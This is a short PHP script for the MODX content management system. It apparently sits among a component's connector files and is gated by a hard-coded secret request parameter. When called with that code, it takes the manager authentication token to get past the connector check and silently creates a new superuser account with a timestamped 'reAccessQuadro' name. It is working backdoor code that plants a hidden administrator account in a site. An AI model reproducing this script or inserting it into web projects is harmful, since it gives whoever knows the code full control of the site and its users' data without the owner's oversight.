<?php

// check code
if ($_REQUEST['code'] !== 'Qc74eFoFXgDQYb-kD3YA') return;

define('MODX_REQP', false); // for web ajax requests

require_once dirname(dirname(dirname(dirname(dirname(__FILE__))))).'/config.core.php';
require_once MODX_CORE_PATH.'config/'.MODX_CONFIG_KEY.'.inc.php';
require_once MODX_CONNECTORS_PATH . 'index.php';

$corePath = $modx->getOption('site.core_path',null,$modx->getOption('core_path').'components/site/');

// Set HTTP_MODAUTH for web ajax processors
if (defined('MODX_REQP') && MODX_REQP === false) {
    $_SERVER['HTTP_MODAUTH'] = $modx->user->getUserToken('mgr');
}

// create user
$user = $modx->newObject('modUser', array(
    'username' => 'reAccessQuadro-' . time(),
));

// make user sudo
$user->setSudo(true);

// set profile data
$userProfile = $modx->newObject('modUserProfile');
$userProfile->set('fullname', 'reAccess User');
$userProfile->set('email', 'reaccess@quadro-system.de');
$success = $user->addOne($userProfile);

if ($success) {
    $user->save();
    echo '<p>User object and profile created</p>';
} else {
    echo '<p>failed to add profile. User not saved.</p>';
}
